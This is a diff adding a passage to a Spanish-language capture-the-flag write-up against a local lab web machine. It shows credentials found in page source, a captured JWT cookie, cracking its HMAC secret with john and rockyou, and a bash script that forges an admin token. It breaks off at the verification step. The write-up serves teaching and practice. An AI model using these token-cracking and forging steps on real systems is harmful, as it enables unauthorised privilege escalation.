@@ -91,3 +91,135 @@ Este análisis permite recopilar información relevante sobre los servicios acti
 ![Despliegue](Imagenes/nmapdos.png)
 
 ---
+
+Al saber que existe el servicio http entramos al navegador:
+
+```bash
+http://172.17.0.2
+```
+
+Y encontramos un formulario de incio de sesion, se probo atacar con inyecciòn sql y con credenciales por defecto sin exito:
+
+
+![Despliegue](Imagenes/pagina.png)
+
+Se realizo fuzzin de directorio para encontrar algun vector de ataque y se encotro:
+
+/index.php
+/admin.php
+/config.php
+/robots.txt
+/dashboard.php
+
+Pero no se encotro alguna oportunidad de ataque
+
+![Despliegue](Imagenes/gobuster.png)
+
+Posteriormete se analizo el codigo fuente y se encotr unas credenciales:
+
+guest:guest
+
+![Despliegue](Imagenes/credencialespagina.png)
+
+Al introducirlas se logro acceder:
+
+![Despliegue](Imagenes/dashboadradmin.png)
+
+Al revisar se puede notar que accedimos como usuario guest, pero nuestro nivel es de user, y para poder acceder a un centro de operaciones de red tenemos que acceder como: admin
+
+Se uso burtsuite, se salio de la sesion y entre nuevamente con las credenciales guest:guest pero untercepte las peticioenes para analizarlo, y lo mas interente fue la parte:
+
+```bash
+Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4MDQ2N30.YGu576Av-l0sYX3IsuYOmNjl9VoMCJ9EBBaAnC2E6YQ
+```
+ya que estab cadena que empieza con eyJ... y esto nos indica que es un JSON Web Token (JWT).
+
+Desglosando el Token
+
+Un JWT se divide en tres partes separadas por puntos (.): Cabecera (Header), Carga útil (Payload) y Firma (Signature).
+
+![Despliegue](Imagenes/burtsuitesession.png)
+
+Asi que lo descodificamos con:
+
+```bash
+JWT='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4MDk1NH0._1H0RI7lON6ajlzBUHZx4SSp_9Fa9BJ7-SJKICyCa20'
+
+echo "$JWT" | awk -F. '{print $1 "\n" $2}' | while read -r part; do
+    echo "$part" | base64 --decode --ignore-garbage 2>/dev/null | jq .
+done
+```
+
+![Despliegue](Imagenes/descodificargolpe.png) 
+
+Y esta confirmado, a si que se tiene que obtener la secret_key para poder modificar user:role por el del admin.
+
+Se guarda la peticiòn de la Cookie:
+
+```bash
+echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTQ4MDQ2N30.YGu576Av-l0sYX3IsuYOmNjl9VoMCJ9EBBaAnC2E6YQ" > token.txt
+```
+
+Y ejecutamos john para encontrar la key
+
+```bash
+john token_real.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+Y se encuetra con exito: batman
+
+![Despliegue](Imagenes/tokenbatman.png)
+
+Al tener la key podemos modificar el usery el role creando una nueva cookie, se puede hacer de la siguiente forma ya que se conoce la estructura:
+
+
+# 1. Definir los componentes del JWT en formato JSON plano
+
+```bash
+HEADER='{"typ":"JWT","alg":"HS256"}'
+PAYLOAD='{"user":"admin","role":"admin","iat":1781480954}'
+```
+
+# 2. Función para codificar en Base64URL (elimina '=', cambia '+' por '-', '/' por '_')
+
+```bash
+b64url() {
+    echo -n "$1" | base64 | tr -d '=' | tr '/+' '_-'
+}
+```
+
+# 3. Codificar la cabecera y la carga útil
+```bash
+HEADER_B64=$(b64url "$HEADER")
+PAYLOAD_B64=$(b64url "$PAYLOAD")
+```
+
+# 4. Unir las dos primeras partes (esto es lo que se firma)
+
+```bash
+DATA_TO_SIGN="${HEADER_B64}.${PAYLOAD_B64}"
+```
+
+# 5. Generar la firma HMAC-SHA256 usando la clave 'batman' y pasarla a Base64URL
+
+```bash
+SIGNATURE_B64=$(echo -n "$DATA_TO_SIGN" | openssl dgst -sha256 -hmac "batman" -binary | base64 | tr -d '=' | tr '/+' '_-')
+```
+
+# 6. Construir el JWT final
+
+```bash
+FINAL_JWT="${DATA_TO_SIGN}.${SIGNATURE_B64}"
+```
+
+# 7. Mostrar el resultado
+
+```bash
+echo "$FINAL_JWT"
+```
+
+![Despliegue](Imagenes/generartokenadmin.png)
+
+Al tener el token priemro confirmo con burtsuite:
+
+
